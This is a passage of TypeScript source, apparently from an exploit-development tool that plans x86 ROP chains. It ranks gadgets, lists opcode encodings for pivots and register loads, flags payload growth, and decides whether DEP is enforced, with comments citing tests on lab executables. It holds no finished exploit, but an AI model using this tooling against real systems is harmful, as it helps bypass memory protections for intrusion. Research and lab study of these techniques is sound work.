      }
    }
    return plan;
  });

  // A register the chain can fill from its own dwords: a pop of it, or a pop of another and a copy over.
  function load(target: Reg, keep: string[]): RopGadget[] | undefined {
    for (const via of [target, ...REACH_REGS.filter((r) => r !== target && keep.indexOf(r) < 0)]) {
      const pop = index!.gadgets.filter((gadget) => exclude.indexOf(gadgetAddress(gadget)) < 0
        && gadget.instructions[0]?.mnemonic === "pop" && gadget.instructions[0].operands[0]?.trim().toLowerCase() === via && !movesEsp(gadget))[0];
      const move = pop ? search.copy(via, target, keep) : undefined;
      if (pop && move) return [pop, ...move.map((effect) => effect.gadget)];
    }
    return undefined;
  }
}

export function gadgetAddress(gadget: RopGadget): number {
  return gadget.locations.find((location) => location.virtualAddress !== undefined)?.virtualAddress ?? 0;
}

export function hex32(value: number): string {
  return `0x${(value >>> 0).toString(16).toUpperCase().padStart(8, "0")}`;
}

export function sequence(gadget: RopGadget): string {
  return gadget.instructions.map((instruction) => instruction.normalizedText).join(" ; ");
}

// What else a gadget does besides its job: the registers it changes, how far it moves ESP,
// the pops a chain must pad for, and a ret N that skips dwords after it.
export function sideEffects(gadget: RopGadget, job: Job): string {
  const summary = gadget.semanticSummary.summary;
  const written = writtenRegisters(gadget);
  const deltas = [...summary.stackDelta.values.exact];
  const stack = deltas.length === 1 ? `esp +0x${deltas[0].toString(16)}` : "esp ?";
  const intended = jobCapability(gadget, job)?.register;
  const pops = gadget.instructions.filter((instruction) =>
    instruction.mnemonic === "pop" && instruction.operands[0]?.trim().toLowerCase() !== intended).length;
  const last = gadget.instructions[gadget.instructions.length - 1];
  const retN = last?.mnemonic === "ret" && last.operands.length === 1 ? `ret ${last.operands[0]}` : "";
  return [
    `writes ${written.length > 0 ? written.join(" ") : "nothing"}`,
    stack,
    pops > 0 ? `${pops} extra pop${pops > 1 ? "s" : ""}` : "",
    retN,
  ].filter(Boolean).join(", ");
}

const pathText = (path: NonNullable<JobPlan["path"]>): string =>
  `no single gadget does it, a sequence does: ${path.from} into ${path.to} by ${path.gadgets.map(sequence).join(", then ")}`;

// The pick, up to three candidates the old ranking put above it, and up to two usable alternatives after it.
export function planLines(plan: JobPlan): string[] {
  const { job, live, verdicts, pick } = plan;
  if (verdicts.length === 0 && plan.path) {
    return [`  ${job.title}: ${pathText(plan.path)}`];
  }
  if (verdicts.length === 0) return [`  ${job.title}: none in the corpus`];
  const keep = live.length > 0
    ? ` (keep ${live.map((entry) => ROLE_NAMES[entry.role] ? `${entry.register} = ${ROLE_NAMES[entry.role]}` : entry.register).join(", ")})` : "";
  const at = pick ? verdicts.indexOf(pick) : verdicts.length;
  const above = verdicts.slice(0, at);
  const after = pick ? verdicts.slice(at + 1).filter((verdict) => verdict.usable).slice(0, 2) : [];
  const line = (verdict: Verdict, mark: string, label: string) => [
    `  ${mark} ${hex32(gadgetAddress(verdict.gadget))}  ${sequence(verdict.gadget).padEnd(40)}  ${sideEffects(verdict.gadget, job)}`,
    `      ${label}: ${verdict.reason}`,
  ];
  const lines = [`  ${job.title}${keep}:`];
  for (const verdict of above.slice(0, 3)) lines.push(...line(verdict, " ", verdict.usable ? "usable" : "no"));
  if (above.length > 3) lines.push(`      ... and ${above.length - 3} more above it`);
  if (pick) lines.push(...line(pick, ">", "PICK"));
  if (pick && pick.uncontrolled.length > 0) {
    lines.push(`      !! every candidate for this job reads through ${pick.uncontrolled.join(", ")}. Point ${pick.uncontrolled.join(" and ")} at readable memory before this gadget runs, or the chain dies here.`);
  }
  if (pick && pick.far) {
    lines.push(`      !! every usable candidate for this job takes more than 0x${LARGE_STACK_MOVE.toString(16)} bytes of stack. This one grows the payload by 0x${(stackMove(pick.gadget) ?? 0).toString(16)} bytes of junk: check the overflow has room for it.`);
  }
  if (!pick && plan.path) {
    lines.push(`    ${pathText(plan.path)}`);
  } else if (!pick) lines.push(`    none of the ${verdicts.length} keeps ${live.map((entry) => entry.register).join(", ")}`);
  for (const verdict of after) lines.push(...line(verdict, " ", "usable"));
  return lines;
}

// x86 register numbers, the order ModRM and the one-byte opcodes encode them in.
const REGS = ["eax", "ecx", "edx", "ebx", "esp", "ebp", "esi", "edi"];
const NOT_ESP = [0, 1, 2, 3, 5, 6, 7];
const rm = (mod: number, reg: number, base: number): number => (mod << 6) | (reg << 3) | base;
const pairs = (): number[][] => NOT_ESP.flatMap((a) => NOT_ESP.filter((b) => b !== a).map((b) => [a, b]));

// The plain encodings of each capability a job asks for: `push esp ; pop esi` is 54 5E, `mov eax, esp`
// is 8B C4 or 89 E0. Memory forms skip esp and ebp as bases, which need a SIB byte or a displacement.
const BODIES: Partial<Record<CapabilityKind, (register?: string) => number[][]>> = {
  STACK_POINTER_CAPTURE: () => NOT_ESP.flatMap((r) => [[0x54, 0x58 + r], [0x8b, rm(3, r, 4)], [0x89, rm(3, 4, r)]]),
  REGISTER_ADD: () => pairs().flatMap(([dest, source]) => [[0x01, rm(3, source, dest)], [0x03, rm(3, dest, source)]]),
  MOVE_REGISTER: () => pairs().flatMap(([dest, source]) => [[0x89, rm(3, source, dest)], [0x8b, rm(3, dest, source)]]),
  EXCHANGE_REGISTER: () => [...NOT_ESP.filter((r) => r > 0).map((r) => [0x90 + r]), ...pairs().filter(([a, b]) => a < b).map(([a, b]) => [0x87, rm(3, a, b)])],
  MEMORY_READ: () => NOT_ESP.flatMap((r) => [0, 1, 2, 3, 6, 7].map((base) => [0x8b, rm(0, r, base)])),
  MEMORY_WRITE: () => NOT_ESP.flatMap((r) => [0, 1, 2, 3, 6, 7].map((base) => [0x89, rm(0, r, base)])),
  REGISTER_INCREMENT: () => NOT_ESP.map((r) => [0x40 + r]),
  REGISTER_NEGATE: () => NOT_ESP.map((r) => [0xf7, 0xd8 + r]),
  STACK_PIVOT: () => [[0x94], [0xc9], ...NOT_ESP.flatMap((r) => [[0x87, rm(3, r, 4)], [0x87, rm(3, 4, r)], [0x89, rm(3, r, 4)], [0x8b, rm(3, 4, r)]])],
  LOAD_REGISTER: (register) => NOT_ESP.filter((r) => register === undefined || REGS[r] === register).map((r) => [0x58 + r]),
  DISPATCH_PUSHAD: () => [[0x60]],
};

/** Every plain encoding of the job, each ending in `ret` or `ret N` (-1 is any byte). */
export function encodingsFor(job: Job): number[][] {
  return job.capabilities
    .flatMap((kind) => BODIES[kind]?.(job.register) ?? [])
    .flatMap((body) => [[...body, 0xc3], [...body, 0xc2, -1, -1]]);
}

/** What searching every byte of the modules for a job's encodings showed. */
export type Settled = { modules: string; encodings: number; clean: number[]; dirty: number };

// Only a job the scan left without a pick is searched, so this is the line that replaces "none".
export function settledLines(plan: JobPlan, settled: Settled, exclude: number[]): string[] {
  const searched = `every byte of ${settled.modules} searched for the ${settled.encodings} plain encodings of this job`;
  if (plan.pick) {
    return settled.clean.indexOf(gadgetAddress(plan.pick.gadget)) >= 0
      ? [`      the scan had missed it: ${searched} found it`]
      : [];
  }
  const usable = settled.clean.filter((address) => exclude.indexOf(address) < 0);
  if (settled.clean.length > 0 && usable.length === 0) return [`      absent but for what you excluded: ${searched}, and each hit is one of them`];
  if (settled.clean.length > 0) return [`      ${searched}: ${settled.clean.length} at a clean address, and none of them fits either`];
  return [`      absent from ${settled.modules}: ${searched}, ${settled.dirty > 0 ? `${settled.dirty} hit(s), every one at an address holding a bad byte` : "no hit at all"}`];
}

/** KUSER_SHARED_DATA.NXSupportPolicy, the two low bits of the byte at 0x7FFE02D5: the system DEP
 * policy the kernel applies when it creates a process, readable from any user-mode process. */
export const NX_POLICY_ADDRESS = 0x7ffe02d5;
export const NX_POLICIES = ["AlwaysOff", "AlwaysOn", "OptIn", "OptOut"] as const;
export type NxPolicy = typeof NX_POLICIES[number];

export type DepState = { enforced: boolean | undefined; why: string };

/** Whether this process runs with DEP. The page protection cannot say: the stack is PAGE_READWRITE
 * whether DEP is on or off, so can_execute(@esp) is false either way. Nor can NX_COMPAT alone: an
 * Exploit Protection setting for the program turns DEP on whatever the flag says. Measured on the lab
 * clone, policy OptIn, by running a ret written on the stack: vuln_vanilla.exe (NX_COMPAT disabled) ran
 * it, vuln_dep.exe (enabled) faulted, and vuln_vanilla.exe faulted too once its MitigationOptions set DEP.
 * `forced` is that per-program setting, undefined when the registry could not be read. */
export function depState(policy: NxPolicy | undefined, exe: { name: string; nx: boolean; forced: boolean | undefined } | undefined, optIn: string[]): DepState {
  if (policy === undefined) return { enforced: undefined, why: `the system DEP policy at ${hex32(NX_POLICY_ADDRESS)} is unreadable` };
  if (policy === "AlwaysOn") return { enforced: true, why: "the system policy is AlwaysOn: every process runs with DEP" };
  if (policy === "AlwaysOff") return { enforced: false, why: "the system policy is AlwaysOff: no process runs with DEP" };
  if (policy === "OptOut") return { enforced: true, why: "the system policy is OptOut: every process runs with DEP unless it is on the exceptions list" };
  if (!exe) return { enforced: undefined, why: "the system policy is OptIn and the main executable is not among the loaded modules" };
  if (exe.nx) return { enforced: true, why: `the system policy is OptIn and ${exe.name} opts in (NX_COMPAT enabled)` };
  if (exe.forced) return { enforced: true, why: `Exploit Protection turns DEP on for ${exe.name} (MitigationOptions in its Image File Execution Options key), whatever its NX_COMPAT flag says` };
  if (exe.forced === undefined) return { enforced: undefined, why: `the system policy is OptIn and ${exe.name} does not opt in, but its Exploit Protection setting could not be read` };
  if (optIn.length > 0) return { enforced: undefined, why: `the system policy is OptIn and ${exe.name} does not opt in, but ${optIn.join(", ")} imports SetProcessDEPPolicy and may have turned DEP on at run time` };
  return { enforced: false, why: `the system policy is OptIn, ${exe.name} does not opt in (NX_COMPAT disabled) and no Exploit Protection setting turns DEP on for it` };
}

/** dep_plan(badchars, firstStage?, exclude?, anyway?) is the short call: the tool chooses the API, the
 * modules and the style. This maps it onto the long form, so the command and its explain read one shape. */
export function depPlanArgs(args: unknown[]): unknown[] {
  const short = typeof args[0] === "string" && /^\s*((\\x|0x)?[0-9a-f]{2}[\s,]*)+$/i.test(args[0]);
  return short ? ["", "", args[0], "auto", args[1], args[2], args[3]] : args;
}
